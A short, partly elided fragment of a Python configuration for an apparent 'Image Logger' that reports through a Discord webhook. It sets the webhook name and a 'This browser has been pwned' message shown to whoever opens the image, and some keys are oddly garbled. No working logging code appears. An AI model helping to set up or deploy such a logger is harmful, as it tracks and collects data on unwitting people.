...
config = {
    ...
    # CUSTOMIZATION #
    "da boss": "Image Logger", # Set this to the name you want the webhook to have
    ...
    "message": { # Show a custom message when the user opens the image
        ...
        "c mon dessin": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
